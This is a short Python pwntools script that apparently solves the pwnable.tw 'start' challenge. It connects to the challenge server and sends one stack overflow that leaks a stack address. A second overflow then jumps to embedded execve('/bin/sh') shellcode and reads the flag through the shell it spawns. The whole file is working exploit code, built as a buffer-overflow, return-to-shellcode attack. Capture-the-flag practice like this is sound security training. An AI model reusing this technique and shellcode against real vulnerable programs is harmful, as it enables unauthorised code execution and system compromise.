#MtucX
# pwnable.tw
from pwn import *

#shellcode
shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# leak
leak = p32(0x8048087)
#remote
host = "chall.pwnable.tw"
port = 10000

pwn = remote(host, port)

#local

print pwn.recvuntil("Let's start the CTF:")

payload = "A"*20+leak

pwn.send(payload)

stack = u32(pwn.recv(4))

print hex(stack)

print pwn.recv(1024).encode('hex')

payload = "A"*20+p32(stack+0x14)+shellcode

pwn.send(payload)

pwn.sendline("cat /home/`whoami`/flag")

pwn.interactive()
